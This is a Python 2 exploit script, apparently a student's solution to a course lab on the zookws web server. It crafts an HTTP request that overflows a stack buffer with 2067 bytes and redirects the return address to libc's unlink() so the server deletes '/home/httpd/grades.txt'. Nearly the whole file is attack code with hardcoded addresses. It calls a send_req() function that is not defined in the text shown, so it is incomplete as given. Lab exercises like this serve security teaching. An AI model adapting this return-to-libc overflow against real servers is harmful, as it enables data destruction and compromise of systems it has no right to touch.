#!/usr/bin/env python2
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

unlink_path = "/home/httpd/grades.txt"
stack_buffer = 0xbfffedf8
stack_saved_ebp = 0xbffff608
stack_retaddr = stack_saved_ebp + 4
unlink_addr = 0x401014c0 #address of function unlink()
exit_addr = 0x400589d0 #address of function exit()
target_addr = stack_retaddr + 12 #address of unlink_path

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    req = "GET /"
    req += "A"*2067 #now get to the saved-eip or return address
    req += struct.pack("<I",int(unlink_addr)) #modify return adress to let it point to unlink()
    req += struct.pack("<I",int(exit_addr)) #adress of exit() to let it terminate gracefully
    req += struct.pack("<I",int(target_addr)) #argument address for function unlink()
    #I put "unlink_path" here because http_request_line() will replace the ' ' before "HTTP" with '\0'.
    req +=  urllib.quote(unlink_path) #real argument form function unlink()
    req += " HTTP/1.0"+ "\r\n\r\n"

    #req =   "GET /"+ "A"*2067 + struct.pack("<I",int(unlink_addr))+struct.pack("<I",int(exit_addr))+struct.pack("<I",int(target_addr)) + urllib.quote(unlink_path) + " HTTP/1.0"+ "\r\n\r\n"
    return req

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

